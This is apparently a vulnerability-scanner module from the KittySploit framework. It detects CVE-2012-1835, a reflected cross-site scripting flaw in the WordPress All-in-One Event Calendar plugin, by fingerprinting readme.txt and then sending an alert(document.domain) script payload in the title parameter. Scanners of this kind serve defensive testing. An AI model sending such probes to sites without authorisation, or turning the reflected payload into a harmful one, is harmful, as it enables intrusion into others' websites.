#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple cross-site scripting vulnerabilities in the All-in-One Event Calendar plugin 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin All-in-One Event Calendar 1.4 - Cross-Site Scripting Detection',
        'description': 'Multiple cross-site scripting vulnerabilities in the All-in-One Event Calendar plugin 1.4 and 1.5 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) title parameter to app/view/agenda-widget-form.php; (2) args, (3) title, (4) before_title, or (5) after_title parameter to app/view/agenda-widget.php; (6) button_value parameter to app/view/box_publish_button.php; or (7) msg parameter to /app/view/save_successful.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'wordpress', 'xss', 'wp-plugin', 'timely', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-1835',
            'https://www.htbridge.com/advisory/HTB23082',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2012-1835',
    }

    def run(self):
        path = '/wp-content/plugins/all-in-one-event-calendar/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('All-in-One Event Calendar',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Plugin All-in-One Event Calendar 1.4 - Cross-Site Scripting detected', path=path)
            return True
        return False

